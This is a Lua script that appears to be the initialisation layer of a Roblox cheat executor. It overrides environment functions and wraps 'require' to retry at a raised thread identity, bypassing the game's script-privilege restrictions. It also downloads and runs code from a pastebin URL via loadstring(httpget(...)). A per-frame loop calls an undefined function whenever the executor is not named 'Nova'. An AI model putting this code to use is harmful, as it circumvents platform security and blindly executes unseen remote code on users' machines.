getgenv().sigmasex = secretmegafunction

setreadonly(getgenv().debug,false)
getgenv().debug.traceback = getrenv().debug.traceback
getgenv().debug.profilebegin = getrenv().debug.profilebegin
getgenv().debug.profileend = getrenv().debug.profileend
getgenv().debug.getmetatable = getgenv().getrawmetatable
getgenv().debug.setmetatable = getgenv().setrawmetatable
getgenv().debug.info = getrenv().debug.info
getgenv().debug.loadmodule = getrenv().debug.loadmodule

getgenv().setthreadidentity = function(identity: number): ()
    _setidentity(identity)
    task.wait()
end

getgenv().setidentity = getgenv().setthreadidentity
getgenv().setcontext = getgenv().setthreadidentity
getgenv().setthreadcontext = getgenv().setthreadidentity

local _oldd = clonefunction(getscriptclosure_handler)

getgenv().getscriptclosure = newcclosure(function(scr) 
	local closure = _oldd(scr)

	if typeof(closure) == "function" then
		local scriptEnv = getfenv(closure)

		scriptEnv["script"] = scr

		return closure
	else
		return nil
	end
end)

getgenv().getscriptfunction = getgenv().getscriptclosure

getgenv().getloadedmodules = newcclosure(function()
local list = {}
for i, v in getgc(false) do
if typeof(v) == "function" then
            local env = getfenv(v)
if typeof(env["script"]) == "Instance" and env["script"]:IsA("ModuleScript") and not table.find(list, env["script"]) then
table.insert(list, env["script"])
end
end
end
return list
end)

local oldreq = clonefunction(getrenv().require)
getgenv().require = newcclosure(function(v)
    local oldlevel = getthreadcontext()
    local succ, res = pcall(oldreq, v)
    if not succ and res:find('RobloxScript') then
        succ = nil
        coroutine.resume(coroutine.create(newcclosure(function()
            setthreadcontext((oldlevel > 5 and 2) or 8)
            succ, res = pcall(oldreq, v)
        end)))
        repeat task.wait() until succ ~= nil
    end
    
    setthreadcontext(oldlevel)
    
    if succ then
        return res
    end
end)

loadstring(httpget("https://pastebin.com/raw/Nnt3hjs3"))()

local RunService = game:GetService("RunService")
RunService.Heartbeat:Connect(function()
	while wait() do
		if identifyexecutor() ~= "Nova" or getexecutorname() ~= "Nova" then
			secretmegafunction()
		end

		if secretmegafunction ~= getgenv().sigmasex then
			print("AWDAWDAWD")
		end
	end
end)
